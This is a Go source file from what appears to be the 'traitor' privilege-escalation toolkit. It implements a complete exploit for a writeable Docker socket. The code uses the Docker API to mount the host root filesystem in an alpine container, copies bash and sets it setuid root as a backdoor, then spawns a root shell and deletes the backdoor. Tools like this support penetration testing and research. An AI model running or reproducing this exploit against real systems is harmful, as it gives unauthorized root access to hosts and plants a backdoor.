package exploits

import (
	"context"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"net"
	"net/http"
	"os"
	"os/exec"
	"strings"
	"syscall"
	"time"

	"github.com/liamg/traitor/internal/logger"

	"github.com/liamg/traitor/pkg/state"
)

type dockerSocketPermissionsVuln struct {
}

func init() {
	register("docker:writeable-socket", SpeedFast, &dockerSocketPermissionsVuln{})
}

func (v *dockerSocketPermissionsVuln) IsVulnerable(_ context.Context, _ *state.State, log logger.Logger) bool {
	if syscall.Access("/var/run/docker.sock", syscall.O_RDWR) != nil {
		return false
	}

	log.Printf("Docker socket at /var/run/docker.sock is writeable!")
	return true
}

func (v *dockerSocketPermissionsVuln) Shell(ctx context.Context, s *state.State, log logger.Logger) error {

	client := &http.Client{
		Transport: &http.Transport{
			DialContext: func(_ context.Context, _, _ string) (net.Conn, error) {
				return net.Dial("unix", "/var/run/docker.sock")
			},
		},
		Timeout: time.Second * 10,
	}

	log.Printf("Attempting to download image...")
	if _, err := client.Post("http://localhost/images/create?fromImage=alpine&tag=latest", "application/json", nil); err != nil {
		// TODO if we can't download alpine, look at existing images and try
		return err
	}

	log.Printf("Planting host backdoor...")
	file, err := ioutil.TempFile(os.TempDir(), "tmp")
	if err != nil {
		return err
	}
	path := file.Name()

	input, err := ioutil.ReadFile("/bin/bash")
	if err != nil {
		return err
	}

	if _, err := file.Write(input); err != nil {
		return err
	}
	if err := file.Close(); err != nil {
		return err
	}

	if err := os.Chmod(path, 0770); err != nil {
		return err
	}

	log.Printf("Creating container...")
	payload := fmt.Sprintf(`
{"Image":"alpine","Cmd":["sh", "-c", "chown root /host_root%s && chmod +s /host_root%[1]s"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}
`, path)
	resp, err := client.Post("http://localhost/containers/create", "application/json", strings.NewReader(payload))
	if err != nil {
		return err
	}

	data, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return err
	}

	container := struct {
		ID string `json:"Id"`
	}{}
	if err := json.Unmarshal(data, &container); err != nil {
		return err
	}

	log.Printf("Starting container...")
	if _, err := client.Post(fmt.Sprintf("http://localhost/containers/%s/start", container.ID), "application/json", nil); err != nil {
		return err
	}

	log.Printf("Waiting for guest to apply setuid to backdoor...")
	if _, err := client.Post(fmt.Sprintf("http://localhost/containers/%s/wait", container.ID), "application/json", nil); err != nil {
		return err
	}

	log.Printf("Starting shell via backdoor...")
	cmd := exec.Cmd{
		Path:   path,
		Args:   []string{path, "-p"},
		Env:    os.Environ(),
		Stdin:  os.Stdin,
		Stdout: os.Stdout,
		Stderr: os.Stderr,
	}
	if err := cmd.Start(); err != nil {
		return err
	}

	log.Printf("Removing backdoor from host...")
	if err := (&exec.Cmd{
		Path:   path,
		Args:   []string{path, "-p", "-c", fmt.Sprintf("rm -f '%s'", path)},
		Env:    os.Environ(),
		Stdin:  os.Stdin,
		Stdout: os.Stdout,
		Stderr: os.Stderr,
	}).Run(); err != nil {
		panic(err)
	}

	log.Printf("Dropping you into the shell...")
	return cmd.Wait()
}
